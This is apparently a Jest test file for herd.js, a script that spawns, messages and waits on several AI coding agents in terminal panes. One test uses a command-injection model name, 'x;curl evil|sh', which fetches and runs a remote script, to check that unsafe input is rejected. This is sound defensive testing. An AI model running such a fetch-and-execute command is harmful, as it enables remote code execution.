const h = require('../skills/herdr/scripts/herd.js');

const AGENTS = {
  result: {
    agents: [
      { name: 'sly', agent: 'claude', pane_id: 'w1:p1', workspace_id: 'w1', agent_status: 'idle' },
      { name: 'jay', agent: 'codex', pane_id: 'w1:p2', workspace_id: 'w1', agent_status: 'working' },
      { name: 'tim', agent: 'opencode', pane_id: 'w2:p1', workspace_id: 'w2', agent_status: 'done' },
      { pane_id: 'w3:p1', workspace_id: 'w3', agent_status: 'idle' }, // unnamed
    ],
  },
};

const WORKTREE = {
  result: { worktree: { open_workspace_id: 'w7', path: '/wt/x' }, root_pane: { pane_id: 'w7:p1' } },
};

describe('pane', () => {
  test('returns pane_id for a handle', () => {
    expect(h.pane(AGENTS, 'jay')).toBe('w1:p2');
  });
  test('undefined for unknown handle', () => {
    expect(h.pane(AGENTS, 'nope')).toBeUndefined();
  });
});

describe('status', () => {
  test('by handle', () => { expect(h.status(AGENTS, 'tim')).toBe('done'); });
  test('by pane_id', () => { expect(h.status(AGENTS, 'w1:p1')).toBe('idle'); });
});

describe('members', () => {
  test('all named handles when no workspace', () => {
    expect(h.members(AGENTS).sort()).toEqual(['jay', 'sly', 'tim']);
  });
  test('filtered by workspace_id', () => {
    expect(h.members(AGENTS, 'w1').sort()).toEqual(['jay', 'sly']);
  });
});

describe('field', () => {
  test('extracts a dot path', () => {
    expect(h.field(WORKTREE, 'result.worktree.open_workspace_id')).toBe('w7');
  });
  test('nested', () => {
    expect(h.field(WORKTREE, 'result.root_pane.pane_id')).toBe('w7:p1');
  });
  test('undefined for missing path', () => {
    expect(h.field(WORKTREE, 'result.nope.x')).toBeUndefined();
  });
});

describe('submitKeys', () => {
  test('codex panes get two Enters', () => {
    expect(h.submitKeys(AGENTS, 'jay')).toEqual(['Enter', 'Enter']);
  });
  test('non-codex panes get one Enter', () => {
    expect(h.submitKeys(AGENTS, 'sly')).toEqual(['Enter']);
  });
  test('can resolve by pane_id', () => {
    expect(h.submitKeys(AGENTS, 'w1:p2')).toEqual(['Enter', 'Enter']);
  });
  test('unknown target returns no keys', () => {
    expect(h.submitKeys(AGENTS, 'nope')).toEqual([]);
  });
});

describe('format', () => {
  test('arrays join by newline', () => { expect(h.format(['a', 'b'])).toBe('a\nb'); });
  test('null/undefined -> empty string', () => {
    expect(h.format(undefined)).toBe('');
    expect(h.format(null)).toBe('');
  });
  test('scalars stringified', () => { expect(h.format('w7')).toBe('w7'); });
});

describe('dispatch', () => {
  test('routes members --workspace', () => {
    expect(h.dispatch(['members', '--workspace', 'w2'], AGENTS)).toEqual(['tim']);
  });
  test('routes submit-keys', () => {
    expect(h.dispatch(['submit-keys', 'jay'], AGENTS)).toEqual(['Enter', 'Enter']);
  });
  test('throws on unknown command', () => {
    expect(() => h.dispatch(['bogus'], AGENTS)).toThrow(/unknown command/);
  });
});

describe('loadAgentList (self-exec fallback)', () => {
  test('uses piped data when present, never calling run (TTY/no-fetch path)', () => {
    let called = false;
    const deps = { run: () => { called = true; return '{}'; } };
    expect(h.loadAgentList(AGENTS, deps)).toBe(AGENTS);
    expect(called).toBe(false);
  });
  test('runs `herdr agent list` when stdin data is empty (no-stdin path)', () => {
    const calls = [];
    const deps = { run: (f, a) => { calls.push([f, ...a]); return JSON.stringify(AGENTS); } };
    const out = h.loadAgentList({}, deps);
    expect(calls).toEqual([['herdr', 'agent', 'list']]);
    expect(h.pane(out, 'jay')).toBe('w1:p2');
  });
  test('with neither stdin nor a runner, returns the input untouched', () => {
    expect(h.loadAgentList({}, undefined)).toEqual({});
  });
});

describe('dispatch self-exec', () => {
  test('status with empty stdin fetches the list via run', () => {
    const deps = { run: () => JSON.stringify(AGENTS) };
    expect(h.dispatch(['status', 'tim'], {}, deps)).toBe('done');
  });
});

describe('parseWait', () => {
  test('defaults: idle, 45s, 1s interval', () => {
    expect(h.parseWait(['jay'])).toEqual({ handle: 'jay', statuses: ['idle'], timeout: 45000, interval: 1000 });
  });
  test('comma statuses and overrides', () => {
    expect(h.parseWait(['jay', '--status', 'idle,done', '--timeout', '9000', '--interval', '250']))
      .toEqual({ handle: 'jay', statuses: ['idle', 'done'], timeout: 9000, interval: 250 });
  });
});

describe('waitCmd', () => {
  test('returns as soon as the status matches one of the set', () => {
    const seq = ['working', 'working', 'done']; let i = 0;
    const deps = {
      run: () => JSON.stringify({ result: { agents: [{ name: 'jay', agent_status: seq[i++] }] } }),
      sleep: () => {}, now: () => 0,
    };
    expect(h.waitCmd(['jay', '--status', 'idle,done', '--interval', '1'], deps)).toBe('done');
  });
  test('throws on timeout, reporting the last seen status', () => {
    let t = 0;
    const deps = {
      run: () => JSON.stringify({ result: { agents: [{ name: 'jay', agent_status: 'working' }] } }),
      sleep: () => {}, now: () => (t += 1000),
    };
    expect(() => h.waitCmd(['jay', '--timeout', '1500', '--interval', '1'], deps))
      .toThrow(/wait timeout: jay is working, want idle/);
  });
});

describe('resolveSelf', () => {
  const DATA = { result: { agents: [
    { name: 'paul', pane_id: 'w1M:p5' },
    { name: 'cal', pane_id: 'w1M:p4', focused: true },
  ] } };

  test('override wins over everything', () => {
    expect(h.resolveSelf(DATA, 'kris', { HERDR_PANE_ID: 'w1M:p5' })).toBe('kris');
  });

  test('resolves the executing pane from HERDR_PANE_ID, not the focused agent', () => {
    expect(h.resolveSelf(DATA, undefined, { HERDR_PANE_ID: 'w1M:p5' })).toBe('paul');
  });

  test('falls back to the focused agent when HERDR_PANE_ID is absent', () => {
    expect(h.resolveSelf(DATA, undefined, {})).toBe('cal');
  });

  test('falls back to the focused agent when HERDR_PANE_ID matches no agent', () => {
    expect(h.resolveSelf(DATA, undefined, { HERDR_PANE_ID: 'w9:p9' })).toBe('cal');
  });
});

describe('sendCmd', () => {
  // Recipient statuses are served one per `agent list` call so tests can
  // script the idle->working transition that the submit verification polls for.
  function runner({ focused, statuses = ['idle'] } = {}) {
    const calls = [];
    let i = 0;
    const list = () => {
      const st = statuses[Math.min(i++, statuses.length - 1)];
      return JSON.stringify({ result: { agents: [
        { name: 'jay', agent: 'claude', pane_id: 'w1:p2', agent_status: st },
        { name: 'sly', agent: 'claude', pane_id: 'w1:p1', focused: !!focused },
        { name: 'cod', agent: 'codex', pane_id: 'w1:p3', agent_status: st },
      ] } });
    };
    const run = (f, a) => { calls.push([f, ...a]); return (a[0] === 'agent' && a[1] === 'list') ? list() : ''; };
    const submits = () => calls.filter((c) => c[1] === 'pane' && c[2] === 'send-keys');
    return { deps: { run, sleep: () => {}, env: {} }, calls, submits };
  }

  test('plain send: resolve pane, send, Enter, then verify via status poll', () => {
    const { deps, calls, submits } = runner({ statuses: ['idle', 'idle', 'idle', 'working'] });
    expect(h.sendCmd(['jay', 'rerun the test'], deps))
      .toEqual({ result: { type: 'ok' }, pane: 'w1:p2', sent: 'rerun the test', submitted: true });
    expect(calls).toContainEqual(['herdr', 'agent', 'send', 'jay', 'rerun the test']);
    expect(submits()).toEqual([['herdr', 'pane', 'send-keys', 'w1:p2', 'Enter']]);
  });

  test('codex recipient gets two Enters via submitKeys', () => {
    const { deps, submits } = runner({ statuses: ['idle', 'idle', 'idle', 'working'] });
    h.sendCmd(['cod', 'hello'], deps);
    expect(submits()).toEqual([
      ['herdr', 'pane', 'send-keys', 'w1:p3', 'Enter'],
      ['herdr', 'pane', 'send-keys', 'w1:p3', 'Enter'],
    ]);
  });

  test('dropped submit is retried until the recipient starts working', () => {
    // attempt 1: all 4 polls stay idle (Enter was swallowed); attempt 2 lands.
    const statuses = ['idle', 'idle', 'idle', 'idle', 'idle', 'idle', 'idle', 'working'];
    const { deps, submits } = runner({ statuses });
    expect(h.sendCmd(['cod', 'hello'], deps).submitted).toBe(true);
    expect(submits()).toHaveLength(4); // 2 Enters x 2 attempts
  });

  test('reports submitted:false when the recipient never starts working', () => {
    const { deps, submits } = runner({ statuses: ['idle'] });
    expect(h.sendCmd(['cod', 'hello'], deps).submitted).toBe(false);
    expect(submits()).toHaveLength(6); // 2 Enters x 3 attempts, then give up
  });

  test('fast turn (idle->done between polls) still counts as submitted', () => {
    const { deps, submits } = runner({ statuses: ['idle', 'idle', 'idle', 'done'] });
    expect(h.sendCmd(['jay', 'quick one'], deps).submitted).toBe(true);
    expect(submits()).toHaveLength(1);
  });

  test('--reply --from stamps the compact protocol header', () => {
    const { deps, calls } = runner({ statuses: ['working'] });
    expect(h.sendCmd(['jay', 'status?', '--reply', '--from', 'sly'], deps).sent)
      .toBe('[from sly reply] status?');
    expect(calls).toContainEqual(['herdr', 'agent', 'send', 'jay', '[from sly reply] status?']);
  });

  test('--fyi resolves <self> from the executing pane, not the focused agent', () => {
    const { deps } = runner({ focused: true, statuses: ['working'] }); // focus drifted to sly
    deps.env = { HERDR_PANE_ID: 'w1:p2' }; // but jay is running the send
    expect(h.sendCmd(['cod', 'heads up', '--fyi'], deps).sent).toBe('[from jay fyi] heads up');
  });

  test('--fyi falls back to the focused agent when --from and HERDR_PANE_ID are absent', () => {
    const { deps } = runner({ focused: true, statuses: ['working'] }); // sly is focused
    expect(h.sendCmd(['jay', 'heads up', '--fyi'], deps).sent).toBe('[from sly fyi] heads up');
  });

  test('does not double-prefix an already [from ...] message', () => {
    const { deps } = runner({ focused: true, statuses: ['working'] });
    expect(h.sendCmd(['jay', '[from sly reply] hi', '--reply'], deps).sent).toBe('[from sly reply] hi');
  });

  test('throws on unknown handle', () => {
    const { deps } = runner();
    expect(() => h.sendCmd(['ghost', 'hi'], deps)).toThrow(/no agent: ghost/);
  });

  test('--reply with no focused agent and no --from throws (no silent mis-stamp)', () => {
    const { deps } = runner(); // no agent is focused
    expect(() => h.sendCmd(['jay', 'hi', '--reply'], deps))
      .toThrow(/cannot resolve sender handle/);
  });

  test('--from without a value throws instead of being silently ignored', () => {
    const { deps } = runner({ focused: true });
    expect(() => h.sendCmd(['jay', 'hi', '--reply', '--from'], deps)).toThrow(/--from needs a value/);
  });
});

describe('sendWaitReadCmd', () => {
  function runner() {
    const calls = [];
    const seq = ['working', 'done'];
    let i = 0;
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: [
          { name: 'gus', agent: 'claude', pane_id: 'w1:p2', agent_status: seq[Math.min(i++, seq.length - 1)] },
          { name: 'sly', agent: 'claude', pane_id: 'w1:p1', focused: true },
        ] } });
      }
      if (a[0] === 'pane' && a[1] === 'read') return 'REVIEW: looks good\n';
      return '';
    };
    return { calls, deps: { run, sleep: () => {}, now: () => 0 } };
  }

  test('sends, waits for not-working, reads recent, returns the text', () => {
    const { calls, deps } = runner();
    const out = h.sendWaitReadCmd(['gus', 'review please', '--reply', '--from', 'sly', '--lines', '50'], deps);
    expect(out).toBe('REVIEW: looks good\n');
    expect(calls).toContainEqual(['herdr', 'agent', 'send', 'gus', '[from sly reply] review please']);
    expect(calls).toContainEqual(['herdr', 'pane', 'read', 'w1:p2', '--source', 'recent', '--lines', '50']);
  });
});

describe('agentCmd', () => {
  const TAB = JSON.stringify({ result: { tab: { tab_id: 'wR:t2' }, root_pane: { pane_id: 'wR:p2' } } });
  function runner(existing = []) {
    const calls = [];
    const run = (f, a) => {
      calls.push([f, ...a]);
      if (a[0] === 'agent' && a[1] === 'list') {
        return JSON.stringify({ result: { agents: existing.map((name) => ({ name })) } });
      }
      return (a[0] === 'tab' && a[1] === 'create') ? TAB : '';
    };
    return { run, calls };
  }

  test('codex agent: preflight, tab create -> run -> wait -> rename', () => {
    const { run, calls } = runner();
    const out = h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(out).toEqual({ handle: 'jay', model: 'codex', pane_id: 'wR:p2', tab: 'wR:t2' });
    expect(calls).toEqual([
      ['herdr', 'agent', 'list'],
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'jay ◇', '--no-focus'],
      ['herdr', 'pane', 'run', 'wR:p2', 'codex'],
      ['herdr', 'wait', 'agent-status', 'wR:p2', '--status', 'idle', '--timeout', '45000'],
      ['herdr', 'agent', 'rename', 'wR:p2', 'jay'],
    ]);
  });

  test('preflight rejects a globally taken handle without creating a tab', () => {
    const { run, calls } = runner(['jay']);
    expect(() => h.agentCmd(['codex', 'jay', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
      .toThrow(/handle already taken: jay/);
    expect(calls.some((c) => c[1] === 'tab' && c[2] === 'create')).toBe(false);
  });

  test('--timeout overrides the idle wait', () => {
    const { run, calls } = runner();
    h.agentCmd(['claude', 'sly', '--workspace', 'wR', '--cwd', '/wt/x', '--timeout', '9000'], { run });
    expect(calls).toContainEqual(['herdr', 'wait', 'agent-status', 'wR:p2', '--status', 'idle', '--timeout', '9000']);
  });

  test('missing --cwd throws', () => {
    const { run } = runner();
    expect(() => h.agentCmd(['claude', 'sly', '--workspace', 'wR'], { run }))
      .toThrow(/--workspace and --cwd are required/);
  });

  test('opencode agent runs the sanitized model argv', () => {
    const { run, calls } = runner();
    const out = h.agentCmd(['opencode', 'bob:ollama/qwen2.5:7b', '--workspace', 'wR', '--cwd', '/wt/x'], { run });
    expect(out).toEqual({ handle: 'bob', model: 'opencode', pane_id: 'wR:p2', tab: 'wR:t2' });
    expect(calls).toContainEqual(['herdr', 'pane', 'run', 'wR:p2', 'opencode -m ollama/qwen2.5:7b']);
    expect(calls).toContainEqual(
      ['herdr', 'tab', 'create', '--workspace', 'wR', '--cwd', '/wt/x', '--label', 'bob ⬨', '--no-focus']);
  });

  test('opencode agent with an unsafe model is rejected before any herdr call', () => {
    const { run, calls } = runner();
    expect(() => h.agentCmd(['opencode', 'bob:x;curl evil|sh', '--workspace', 'wR', '--cwd', '/wt/x'], { run }))
      .toThrow(/unsafe characters/);
    expect(calls).toEqual([]); // makeAgent throws before the preflight list or tab create
  });
});

describe('defaultDeps', () => {
  test('sleep blocks for the requested ms without spawning a subprocess', () => {
    const deps = h.defaultDeps();
    expect(typeof deps.sleep).toBe('function');
    const t0 = Date.now();
    deps.sleep(15);
    expect(Date.now() - t0).toBeGreaterThanOrEqual(10);
  });
});

describe('dispatch routes action verbs', () => {
  test('routes wait through waitCmd', () => {
    const deps = {
      run: () => JSON.stringify({ result: { agents: [{ name: 'jay', agent_status: 'idle' }] } }),
      sleep: () => {}, now: () => 0,
    };
    expect(h.dispatch(['wait', 'jay'], {}, deps)).toBe('idle');
  });
  test('unknown verb still throws', () => {
    expect(() => h.dispatch(['bogus'], {}, {})).toThrow(/unknown command/);
  });
});

describe('usage / --help', () => {
  test('send --help prints usage instead of resolving --help as a handle', () => {
    const calls = [];
    const deps = { run: (f, a) => { calls.push([f, ...a]); return '{}'; } };
    const out = h.dispatch(['send', '--help'], {}, deps);
    expect(out).toMatch(/usage: herd\.js/);
    expect(calls).toEqual([]); // short-circuits before `herdr agent list`
  });
  test('bare --help, -h, and no verb print usage', () => {
    expect(h.dispatch(['--help'], {}, {})).toMatch(/usage: herd\.js/);
    expect(h.dispatch(['-h'], {}, {})).toMatch(/usage: herd\.js/);
    expect(h.dispatch([], {}, {})).toMatch(/usage: herd\.js/);
  });
  test('usage warns that the native wait takes a single status, not a comma list', () => {
    expect(h.usage()).toMatch(/herdr wait agent-status.*one\b/i);
  });
});

describe('herd.js main wiring (child process)', () => {
  const path = require('path');
  const { execFileSync } = require('child_process');
  const HERD = path.join(__dirname, '..', 'skills', 'herdr', 'scripts', 'herd.js');
  test('unknown verb exits non-zero with a stderr diagnostic (deps wired)', () => {
    let err;
    try {
      execFileSync('node', [HERD, 'bogus'], { encoding: 'utf8', stdio: 'pipe', input: '' });
    } catch (e) { err = e; }
    expect(err).toBeDefined();
    expect(err.status).toBe(1);
    expect(String(err.stderr)).toMatch(/^herd: unknown command/m);
  });
  test('send --help exits 0 with usage on stdout', () => {
    const out = execFileSync('node', [HERD, 'send', '--help'], { encoding: 'utf8', stdio: 'pipe', input: '' });
    expect(out).toMatch(/usage: herd\.js/);
  });
});
